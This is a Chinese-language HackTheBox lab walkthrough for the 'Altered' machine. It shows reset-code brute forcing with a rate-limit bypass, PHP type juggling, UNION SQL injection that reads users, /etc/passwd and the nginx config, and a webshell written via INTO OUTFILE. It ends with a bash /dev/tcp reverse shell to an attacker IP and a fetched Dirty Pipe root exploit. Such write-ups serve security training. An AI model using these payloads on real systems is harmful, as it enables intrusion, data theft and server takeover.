---
title: HackTheBox-Altered
date: 2022-04-08 09:09:00
categories:
- 渗透测试
tags:
- HackTheBox
---

## 实验环境

![](https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png)

## 寻找立足点

### 端口扫描

先对靶机进行端口扫描，发现只开放了22和80端口

```
nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap
```

![](https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png)

### 登陆界面攻击面测试

访问80端口，是一个登录界面，先尝试登录

![](https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png)

发现当输入账号为`test`时返回用`无效用户名`，当输入用户名为`admin`时返回`密码无效`，存在用户名枚举

![](https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png)

![](https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png)

还有一个`忘记密码`的功能，试试能不能修改`admin`的密码，发现需要填写验证码。

接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。

![](https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png)

### 验证码爆破

接下来尝试抓包对验证码进行爆破

![](https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png)

标记要爆破的参数

![](https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png)

设置payload

![](https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png)

爆破了一会后，状态码就从`200`变成了`429`，应该是出现错误了

![](https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png)

提示了错误信息，可能是爆破请求频繁导致被禁止访问了

![](https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png)

![](https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png)

### 请求次数限制绕过

按照[Bypass Rate Limit](https://www.securecyberfuture.com/post/bypass-rate-limit)的方法尝试绕过访问限制，添加`X-Forwarded-For`字段，返回状态码`200`

![](https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png)

再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破

![](https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png)

![](https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png)

![](https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png)

等待了几分钟后，成功爆破出了验证码

![](https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png)

使用验证码修改了`admin`的密码后登录，跳转到了用户列表

![](https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png)

点击用户栏的`View`会在上方显示出用户的信息

![](https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png)

### PHP弱类型

抓包查看一下

![](https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png)

将请求方式更改为POST，看一下会返回什么。提示不支持POST

![](https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png)

然后试试用POST的请求方式，但将POST改为GET。返回了一些`JSON`格式的信息

![](https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png)

那我们也将请求内容改为`JSON`格式试试。如下，返回正常了

![](https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png)

上面的`cookie`可以看到有`laravel_session`的字段，这个站点是使用的`Laravel`框架，而`Laravel`是一款`PHP`Web开发框架

参考文章[PHP弱类型](https://www.freebuf.com/articles/web/323834.html)，将`secret`的值改为`bool`类型的`true`，任意的`id`的值都能返回正常

![](https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png)

![](https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png)

### SQL注入测试

接着对`id`进行测试，发现添加一个`单引号`，返回`服务器错误`，很明显的`SQL注入`的特征

![](https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png)

接下来试`SQL注入`，先通过`order by`判断字段数，当为`3`时返回正常，`4`时返回错误，因此字段数为`3`

![](https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png)

![](https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png)

接下来通过`union select`查看回显的位置

![](https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png)

将`3`的位置替换为SQL语句可以成功执行

![](https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png)

先爆出所有数据库名

```mysql
-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
```

![image-20220407111855200](https://s2.loli.net/2022/04/07/pmEuLCJZlwr3hVQ.png)

爆出所有表名和列名

```mysql
-2 union select 1,2,group_concat('\n',table_name,':',column_name) from information_schema.columns where table_schema='uhc'-- -
```

![](https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png)

爆出`users`表的内容

```sql
-2 union select 1,2,group_concat('\n',name,':',password) from uhc.users-- -
```

![](https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png)

但是我们已经有`admin`的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了`/etc/passwd`文件

```mysql
-2 union select 1,2,load_file('/etc/passwd')-- -
```

![](https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png)

接下来的思路是通过`SQL注入`往站点写`shell`，来获得服务器权限，但是先要知道站点的真实路径

### SQL注入写shell

在最开始的端口扫描中可以看到，该站点使用了`Nginx`作为中间件，我们可以读取`Nginx`的站点配置文件，来查看配置的站点根目录。尝试读取`Nginx`的站点配置文件的默认路径

```sql
-2 union select 1,2,load_file('/etc/nginx/sites-enabled/default')-- -
```

![](https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png)

如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写`shell`，来得到服务器的初步控制权

通过`into outfile`向网站根目录写入`0.php`，返回`服务器错误`，但是不影响

```sql
-2 union select 1,2,'<?=`$_GET[1]`?>' into outfile'/srv/altered/public/0.php'-- -
```

![](https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png)

访问我们的`shell`，能成功执行系统命令

![](https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png)

## 权限提升

### 反弹shell

通过我们写入的`webshell`，反弹一个`shell`回来，翻遍后续的操作

```
bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'
```

![](https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png)

![](https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png)

本地开启的监听接收到了反弹`shell`

通过以下命令，将反弹回来的`shell`升级为完全交互式的`shell`

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl+z
stty raw -echo; fg
reset
xterm
```

![](https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png)

### Dirty Pipe提权漏洞

查看系统的版本为`5.16`

![](https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png)

前段时间刚爆出了一个Linux的提权漏洞`Dirty Pipe`，看了一下[The Dirty Pipe Vulnerability](https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability)的影响范围：

- version > 5.8
- version < 5.16.11、5.15.25、5.10.102

![](https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png)

这台靶机服务器的版本在影响范围内，所以我们可以直接下载`exploit`并编译，上传到靶机中执行，来获得`root`权限

现在攻击机下载[DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)，并编译。因为攻击机和靶机的Linux版本不一样，所以使用`-fPIC -static`参数进行编译，防止因编译环境不一致导致`exploit`运行出现问题

![](https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png)

```
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c

gcc exploit-2.c -o exp -fPIC -static 
```

在攻击机用`python`起一个简易的服务器

```
python3 -m http.server 80
```

![](https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png)

在靶机下载，并赋予执行权限

```
wget 10.10.16.6/exp

chmod +x ./exp
```

按照`exploit`作者的使用方法，执行`exploit`劫持`SUID`成功提升至`root`权限

![](https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png)

![](https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png)
